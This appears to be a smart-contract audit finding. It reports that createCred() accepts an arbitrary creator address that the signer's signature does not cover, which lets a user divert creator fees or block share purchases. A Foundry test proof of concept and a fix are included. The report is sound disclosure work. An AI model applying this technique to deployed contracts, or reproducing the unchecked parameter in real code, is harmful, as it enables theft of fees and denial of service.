# Vulnerability details

## Impact
phiSignerAddress address can allow any user to create Cred by giving them signed signature, and the user can create the cred with a `creator` address which is controlled by the user to get all of the creator fee or it will  reject receiving ether after first eth receive and resulting no one will be able to purchase any share on this cred.

## Proof of Concept
If a user received phiSignerAddress signature to create a cred, while calling the createCred() function the user can specify any creator address and this doesn't check creator address if it's should be used for the cred resulting the user can specify a address which is controlled by the user to get all of the creator fee or else the user will provide a contract address which will reject any eth transfer happen to that contract.

Here is foundry test case to show that it's possible to provide arbitrary creator address into the createCred() function call:

Save the code into the Cred.t.sol and run `forge test --mt test_Missing_Creator_Check -vvv`:

```
function test_Missing_Creator_Check() external {
        vm.warp(START_TIME + 1);
        vm.startPrank(participant);
        uint256 credId = 1;
        uint256 supply = 0;
        uint256 amount = 1;
        uint256 expiresIn = START_TIME + 100;
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);
        string memory credURL = "test";
        bytes memory signCreateData = abi.encode(
            expiresIn, address(this), 31_337, address(bondingCurve), credURL, "BASIC", "SIGNATURE", 0x0
        );
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
        vm.stopPrank();

        cred.createCred{ value: buyPrice }(address(this), signCreateData, abi.encodePacked(cr, cs), 100, 100);
        console2.log("Creator Address:", cred.getCredCreator(credId));
        
    }
```

## Tools Used
Foundry

## Recommended Mitigation Steps
Add creator address into the signature and use that creator address for the cred creation.
